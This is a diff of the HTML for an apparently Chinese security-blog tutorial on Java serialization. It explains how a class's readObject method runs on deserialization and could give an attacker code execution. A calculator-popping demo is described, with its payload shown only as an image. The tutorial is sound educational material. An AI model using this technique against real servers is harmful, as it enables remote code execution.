关键字表明该属性是短暂的，也就是不会被反序列化</span></span><br><span class="line">   <span class="keyword">public</span> <span class="type">int</span> number;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">mailCheck</span><span class="params">()</span></span><br><span class="line">   &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;Mailing a check to &quot;</span> + name</span><br><span class="line">                           + <span class="string">&quot; &quot;</span> + address);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java">public class Employee implements java.io.Serializable
+&#123;
+   public String name;
+   public String address;
+   public transient int SSN; &#x2F;&#x2F;注意 transient 关键字表明该属性是短暂的，也就是不会被反序列化
+   public int number;
+   public void mailCheck()
+   &#123;
+      System.out.println(&quot;Mailing a check to &quot; + name
+                           + &quot; &quot; + address);
+   &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <h4 id="xu-lie-hua-dui-xiang"><a href="#序列化对象" class="headerlink" title="序列化对象"></a>序列化对象<a href="#xu-lie-hua-dui-xiang" class="header-anchor">#</a></h4><h5 id="yong-dao-de-fu-zhu-lei"><a href="#用到的辅助类" class="headerlink" title="用到的辅助类"></a>用到的辅助类<a href="#yong-dao-de-fu-zhu-lei" class="header-anchor">#</a></h5><p><code>ObjectOutputStream</code> 类用来序列化一个对象，如下的 <code>SerializeDemo</code> 例子实例化了一个 <code>Employee</code> 对象，并将该对象序列化到一个文件中。</p>
 <p>如果你对 Java IO 流不甚理解，那么可以看一下这篇文章：<a target="_blank" rel="noopener" href="http://www.51gjie.com/java/686.html">Java IO流详解</a>、<a target="_blank" rel="noopener" href="https://juejin.cn/post/6844903632207347725">深入学习JAVA -IO流详解</a></p>
-<p><img src="/images/JAVA反序列化/image-20221222234312961.png" alt="image-20221222234312961"></p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo01ObjectOutputStream</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">//1. 创建序列化流，用来写</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;day12\\file03-obj.txt&quot;</span>));</span><br><span class="line">        <span class="comment">//2. 调用writeObject方法，写对象</span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;张三丰&quot;</span>, <span class="number">100</span>);</span><br><span class="line">        oos.writeObject(p);</span><br><span class="line">        <span class="comment">//3. 释放资源。</span></span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h4 id="fan-xu-lie-hua-dui-xiang"><a href="#反序列化对象" class="headerlink" title="反序列化对象"></a>反序列化对象<a href="#fan-xu-lie-hua-dui-xiang" class="header-anchor">#</a></h4><h5 id="yong-dao-de-fu-zhu-lei"><a href="#用到的辅助类-1" class="headerlink" title="用到的辅助类"></a>用到的辅助类<a href="#yong-dao-de-fu-zhu-lei" class="header-anchor">#</a></h5><p><img src="/images/JAVA反序列化/image-20221222234423608.png" alt="image-20221222234423608"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221222234312961.png" alt="image-20221222234312961"></p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java">public class Demo01ObjectOutputStream &#123;
+    public static void main(String[] args) throws IOException &#123;
+        &#x2F;&#x2F;1. 创建序列化流，用来写
+        ObjectOutputStream oos &#x3D; new ObjectOutputStream(new FileOutputStream(&quot;day12\\file03-obj.txt&quot;));
+        &#x2F;&#x2F;2. 调用writeObject方法，写对象
+        Person p &#x3D; new Person(&quot;张三丰&quot;, 100);
+        oos.writeObject(p);
+        &#x2F;&#x2F;3. 释放资源。
+        oos.close();
+    &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="fan-xu-lie-hua-dui-xiang"><a href="#反序列化对象" class="headerlink" title="反序列化对象"></a>反序列化对象<a href="#fan-xu-lie-hua-dui-xiang" class="header-anchor">#</a></h4><h5 id="yong-dao-de-fu-zhu-lei"><a href="#用到的辅助类-1" class="headerlink" title="用到的辅助类"></a>用到的辅助类<a href="#yong-dao-de-fu-zhu-lei" class="header-anchor">#</a></h5><p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221222234423608.png" alt="image-20221222234423608"></p>
 <p><strong>特殊情况:</strong></p>
 <p>被 static 修饰的成员变量无法序列化，无法写到文件。</p>
 <p>如果不希望某个成员变量写到文件，同时又不希望使用 static 关键字， 那么可以使用 transient。transient 关键字表示瞬态，被 transient 修饰的成员变量无法被序列化。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//从文件中读取Person对象</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">readPerson</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">//创建反序列化流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;day12\\file04-obj.txt&quot;</span>));</span><br><span class="line">        <span class="comment">//从文件中读取对象</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">        <span class="comment">//释放资源</span></span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-<h5 id="xu-lie-hua-dai-ma-shi-li"><a href="#序列化代码示例" class="headerlink" title="序列化代码示例"></a>序列化代码示例<a href="#xu-lie-hua-dai-ma-shi-li" class="header-anchor">#</a></h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Demo1.Employee;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializeDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Employee</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Employee</span>();</span><br><span class="line">        e.name = <span class="string">&quot;rain&quot;</span>;</span><br><span class="line">        e.address = <span class="string">&quot;beijing&quot;</span>;</span><br><span class="line">        e.SSN = <span class="number">11122333</span>;</span><br><span class="line">        e.number = <span class="number">101</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            以下操作可以归结为几个步骤：</span></span><br><span class="line"><span class="comment">            1. 定义输出流的源头，也就是说输出流中的数据最终会流向什么地方。</span></span><br><span class="line"><span class="comment">            2. 定于输出流本身</span></span><br><span class="line"><span class="comment">            3. 调用输出流的 writeObject 方法向输出流中写入数据</span></span><br><span class="line"><span class="comment">            4. 关闭相关流</span></span><br><span class="line"><span class="comment">            可以抽象地说我们将对象中的数据序列化放入输出流中，然后输出流流向了test.ser文件里</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fileOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./test.ser&quot;</span>);</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOut);</span><br><span class="line">            out.writeObject(e);</span><br><span class="line">            out.close();</span><br><span class="line">            fileOut.close();</span><br><span class="line">            System.out.printf(<span class="string">&quot;Serialized data is saved in test.ser&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span>(IOException i)&#123;</span><br><span class="line">            i.printStackTrace();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h5 id="fan-xu-lie-hua-dai-ma-shi-li"><a href="#反序列化代码示例" class="headerlink" title="反序列化代码示例"></a>反序列化代码示例<a href="#fan-xu-lie-hua-dai-ma-shi-li" class="header-anchor">#</a></h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Demo2;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> Demo1.Employee;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeserializeDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String [] args)</span>&#123;</span><br><span class="line">        <span class="type">Employee</span> <span class="variable">e</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fileIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./test.ser&quot;</span>);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileIn);</span><br><span class="line">            e = (Employee) in.readObject();</span><br><span class="line">            in.close();</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException i )&#123;</span><br><span class="line">            i.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (ClassNotFoundException c)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Employee class not found&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;Deserialized Employee..&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Name:&quot;</span> + e.name);</span><br><span class="line">        System.out.println(<span class="string">&quot;Address: &quot;</span>+ e.address);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java">&#x2F;&#x2F;从文件中读取Person对象
+    public static void readPerson() throws IOException, ClassNotFoundException &#123;
+        &#x2F;&#x2F;创建反序列化流
+        ObjectInputStream ois &#x3D; new ObjectInputStream(new FileInputStream(&quot;day12\\file04-obj.txt&quot;));
+        &#x2F;&#x2F;从文件中读取对象
+        Object obj &#x3D; ois.readObject();
+        System.out.println(obj);
+        &#x2F;&#x2F;释放资源
+        ois.close();
+    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h5 id="xu-lie-hua-dai-ma-shi-li"><a href="#序列化代码示例" class="headerlink" title="序列化代码示例"></a>序列化代码示例<a href="#xu-lie-hua-dai-ma-shi-li" class="header-anchor">#</a></h5><pre class="line-numbers language-java" data-language="java"><code class="language-java">import Demo1.Employee;
+
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.io.ObjectOutputStream;
+
+public class SerializeDemo &#123;
+    public static void main(String[] args) &#123;
+
+        Employee e &#x3D; new Employee();
+        e.name &#x3D; &quot;rain&quot;;
+        e.address &#x3D; &quot;beijing&quot;;
+        e.SSN &#x3D; 11122333;
+        e.number &#x3D; 101;
+        try&#123;
+            &#x2F;*
+            以下操作可以归结为几个步骤：
+            1. 定义输出流的源头，也就是说输出流中的数据最终会流向什么地方。
+            2. 定于输出流本身
+            3. 调用输出流的 writeObject 方法向输出流中写入数据
+            4. 关闭相关流
+            可以抽象地说我们将对象中的数据序列化放入输出流中，然后输出流流向了test.ser文件里
+             *&#x2F;
+            FileOutputStream fileOut &#x3D; new FileOutputStream(&quot;.&#x2F;test.ser&quot;);
+            ObjectOutputStream out &#x3D; new ObjectOutputStream(fileOut);
+            out.writeObject(e);
+            out.close();
+            fileOut.close();
+            System.out.printf(&quot;Serialized data is saved in test.ser&quot;);
+
+
+
+        &#125;catch(IOException i)&#123;
+            i.printStackTrace();
+
+        &#125;
+    &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h5 id="fan-xu-lie-hua-dai-ma-shi-li"><a href="#反序列化代码示例" class="headerlink" title="反序列化代码示例"></a>反序列化代码示例<a href="#fan-xu-lie-hua-dai-ma-shi-li" class="header-anchor">#</a></h5><pre class="line-numbers language-java" data-language="java"><code class="language-java">package Demo2;
+import java.io.*;
+import Demo1.Employee;
+
+public class DeserializeDemo &#123;
+    public static void main(String [] args)&#123;
+        Employee e &#x3D; null;
+        try&#123;
+            FileInputStream fileIn &#x3D; new FileInputStream(&quot;.&#x2F;test.ser&quot;);
+            ObjectInputStream in &#x3D; new ObjectInputStream(fileIn);
+            e &#x3D; (Employee) in.readObject();
+            in.close();
+
+        &#125;catch (IOException i )&#123;
+            i.printStackTrace();
+            return;
+        &#125;catch (ClassNotFoundException c)&#123;
+            System.out.println(&quot;Employee class not found&quot;);
+
+        &#125;
+        System.out.println(&quot;Deserialized Employee..&quot;);
+        System.out.println(&quot;Name:&quot; + e.name);
+        System.out.println(&quot;Address: &quot;+ e.address);
+
+
+
+    &#125;
+
+&#125;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>这里要注意以下要点：</p>
-<p><code>readObject()</code> 方法中的 try/catch 代码块尝试捕获 <code>ClassNotFoundException</code> 异常。对于 JVM 可以的反序列化对象，它必须是能够找到字节码的类。如果 JVM 在反序列化对象的过程中找不到该类，则抛出一个 <code>ClassNotFoundException</code> 异常。注意，<code>readObject()</code> 方法的返回值被转化成 Employee 引用。</p>
+<p><code>readObject()</code> 方法中的 try&#x2F;catch 代码块尝试捕获 <code>ClassNotFoundException</code> 异常。对于 JVM 可以的反序列化对象，它必须是能够找到字节码的类。如果 JVM 在反序列化对象的过程中找不到该类，则抛出一个 <code>ClassNotFoundException</code> 异常。注意，<code>readObject()</code> 方法的返回值被转化成 Employee 引用。</p>
 <p>当对象被序列化时，属性 SSN 的值为 111222333，但是因为该属性是短暂的，该值没有被发送到输出流。所以反序列化后 Employee 对象的 SSN 属性为 0。</p>
 <h3 id="xu-lie-hua-guo-cheng-zhong-de-zhu-yi-shi-xiang"><a href="#序列化过程中的注意事项" class="headerlink" title="序列化过程中的注意事项"></a>序列化过程中的注意事项<a href="#xu-lie-hua-guo-cheng-zhong-de-zhu-yi-shi-xiang" class="header-anchor">#</a></h3><p>一个类的对象要想序列化成功，必须满足两个条件：</p>
 <ul>
@@ -230,238 +645,873 @@
 <li>readObject</li>
 </ul>
 <p>这两个方法可以经过开发者重写，一般序列化的重写都是由于下面这种场景诞生的。</p>
-<p><img src="/images/JAVA反序列化00/image-20230107151302268.png" alt="image-20230107151302268"></p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span><span class="keyword">throws</span> java.io.IOException</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span><span class="keyword">throws</span> java.io.IOException, ClassNotFoundException</span><br></pre></td></tr></table></figure>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9600/image-20230107151302268.png" alt="image-20230107151302268"></p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java">private void writeObject(java.io.ObjectOutputStream s)throws java.io.IOException
+private void readObject(java.io.ObjectInputStream s)throws java.io.IOException, ClassNotFoundException<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
 <p>只要服务端反序列化数据，客户端传递类的 <code>readObject</code> 中的代码就会自动执行，给予攻击者在服务器上运行代码的能力。所以从根本上来说，java 反序列化的漏洞与 <code>readObject</code> 有关。</p>
 <h4 id="ke-neng-cun-zai-an-quan-lou-dong-de-xing-shi"><a href="#可能存在安全漏洞的形式" class="headerlink" title="可能存在安全漏洞的形式"></a>可能存在安全漏洞的形式<a href="#ke-neng-cun-zai-an-quan-lou-dong-de-xing-shi" class="header-anchor">#</a></h4><h5 id="ru-kou-lei-de-readobject-zhi-jie-diao-yong-wei-xian-fang-fa"><a href="#入口类的-readObject-直接调用危险方法" class="headerlink" title="入口类的 readObject 直接调用危险方法"></a>入口类的 <code>readObject</code> 直接调用危险方法<a href="#ru-kou-lei-de-readobject-zhi-jie-diao-yong-wei-xian-fang-fa" class="header-anchor">#</a></h5><p>这种情况在实际开发场景比较少见，仅作为一个示例演示一下。以下展示了一个弹计算器的代码，思路就是在我们要反序列化的类里面写一个 readObject 方法，这样服务端反序列化时就会自动调用我们写的这个 readObject 方法！</p>
 <p><strong>SerializatinTest.java</strong> 内容如下：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.kuang.reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutput;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializationTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;aa&quot;</span>,<span class="number">22</span>);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">        serialize(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java">package com.kuang.reflection;
+
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.io.ObjectOutput;
+import java.io.ObjectOutputStream;
+
+public class SerializationTest &#123;
+    public static void serialize(Object obj) throws IOException&#123;
+        ObjectOutputStream oos &#x3D; new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(obj);
+    &#125;
+
+    public static void main(String[] args) throws Exception&#123;
+        Person person &#x3D; new Person(&quot;aa&quot;,22);
+        System.out.println(person);
+        serialize(person);
+    &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
 <p><code>UnserializeTest.java</code> 内容如下：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.kuang.reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnserializeTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> (Person)unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java">package com.kuang.reflection;
+
+import java.io.FileInputStream;
+import java.io.IOException;
+import java.io.ObjectInputStream;
+
+public class UnserializeTest &#123;
+    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;
+        ObjectInputStream ois &#x3D; new ObjectInputStream(new FileInputStream(Filename));
+        Object obj &#x3D; ois.readObject();
+        return obj;
+    &#125;
+
+    public static void main(String[] args) throws Exception&#123;
+        Person person &#x3D; (Person)unserialize(&quot;ser.bin&quot;);
+        System.out.println(person);
+    &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
 <p><strong>Person.java</strong> 内容如下：</p>
-<p><img src="/images/JAVA反序列化00/ReadObjectOneScene.png" alt="img"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9600/ReadObjectOneScene.png" alt="img"></p>
 <p>先运行序列化程序，再运行反序列化程序就会自动弹出计算器！入口类的 readObject直接调用危险方法是攻击最理想的情况，但是这种情况几乎不会出现。</p>
-<h4 id="ru-kou-can-shu-zhong-bao-han-ke-kong-lei-gai-lei-you-wei-xian-fang-fa-readobject-shi-diao-yong"><a href="#入口参数中包含可控类，该类有危险方法，-readObject-时调用" class="headerlink" title="入口参数中包含可控类，该类有危险方法， readObject 时调用"></a>入口参数中包含可控类，该类有危险方法， <code>readObject</code> 时调用<a href="#ru-kou-can-shu-zhong-bao-han-ke-kong-lei-gai-lei-you-wei-xian-fang-fa-readobject-shi-diao-yong" class="header-anchor">#</a></h4><h4 id="ru-kou-lei-can-shu-zhong-bao-han-ke-kong-lei-gai-lei-you-diao-yong-qi-ta-you-wei-xian-fang-fa-de-lei-readobject-shi-diao-yong"><a href="#入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject-时调用" class="headerlink" title="入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject 时调用"></a>入口类参数中包含可控类，该类又调用其他有危险方法的类，<code>readObject</code> 时调用<a href="#ru-kou-lei-can-shu-zhong-bao-han-ke-kong-lei-gai-lei-you-diao-yong-qi-ta-you-wei-xian-fang-fa-de-lei-readobject-shi-diao-yong" class="header-anchor">#</a></h4><h4 id="gou-zao-han-shu-jing-tai-dai-ma-kuai-deng-lei-jia-zai-shi-yin-shi-zhi-xing"><a href="#构造函数-静态代码块等类加载时隐式执行" class="headerlink" title="构造函数/静态代码块等类加载时隐式执行"></a>构造函数/静态代码块等类加载时隐式执行<a href="#gou-zao-han-shu-jing-tai-dai-ma-kuai-deng-lei-jia-zai-shi-yin-shi-zhi-xing" class="header-anchor">#</a></h4><h3 id="chan-sheng-lou-dong-de-gong-ji-lu-xian"><a href="#产生漏洞的攻击路线" class="headerlink" title="产生漏洞的攻击路线"></a>产生漏洞的攻击路线<a href="#chan-sheng-lou-dong-de-gong-ji-lu-xian" class="header-anchor">#</a></h3><ul>
